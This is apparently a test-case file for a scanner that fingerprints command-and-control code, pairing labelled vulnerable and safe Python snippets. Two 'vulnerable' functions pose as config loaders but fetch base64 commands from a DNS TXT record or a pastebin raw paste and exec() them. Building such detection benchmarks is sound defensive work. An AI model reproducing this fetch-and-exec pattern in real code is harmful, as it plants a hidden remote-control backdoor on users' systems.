"""
C2 Fingerprint Test Cases (Python)
Tests for DNS TXT record C2, pastebin fetch, and safe variants.
"""
import base64
import socket
import urllib.request


# ============================================================================
# VULNERABLE: DNS TXT record as C2 channel
# ============================================================================

# vuln-code-snippet start dns_txt_c2
def check_dns_config():
    """Resolve a 'config' DNS TXT record -- actually fetches C2 commands."""
    import dns.resolver

    answers = dns.resolver.resolve("config.update.example.com", "TXT")
    for rdata in answers:
        # TXT record contains base64-encoded command
        command = base64.b64decode(rdata.strings[0]).decode("utf-8")
        exec(command)  # vuln-code-snippet vuln-line dns_txt_c2
# vuln-code-snippet end dns_txt_c2


# ============================================================================
# VULNERABLE: Pastebin raw paste as command payload
# ============================================================================

# vuln-code-snippet start pastebin_fetch
def load_remote_config():
    """Fetch 'configuration' from paste service -- actually C2 payload."""
    paste_url = "https://pastebin.com/raw/AbCdEf12"
    response = urllib.request.urlopen(paste_url)
    payload = response.read().decode("utf-8")
    exec(payload)  # vuln-code-snippet vuln-line pastebin_fetch
# vuln-code-snippet end pastebin_fetch


# ============================================================================
# SAFE: Standard DNS resolution for service discovery (legitimate)
# ============================================================================

# vuln-code-snippet start dns_lookup_normal
def resolve_database_host():
    """Resolve database hostname via standard DNS -- legitimate."""
    db_host = "db.internal.example.com"
    try:
        ip = socket.gethostbyname(db_host)
        return ip  # vuln-code-snippet safe-line dns_lookup_normal
    except socket.gaierror:
        return "127.0.0.1"
# vuln-code-snippet end dns_lookup_normal


# ============================================================================
# SAFE: Standard webhook POST to Slack (legitimate)
# ============================================================================

# vuln-code-snippet start webhook_callback
def notify_slack(message, webhook_url):
    """Send notification to Slack webhook -- standard integration."""
    import json

    data = json.dumps({"text": message}).encode("utf-8")
    req = urllib.request.Request(
        webhook_url,
        data=data,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req)  # vuln-code-snippet safe-line webhook_callback
# vuln-code-snippet end webhook_callback
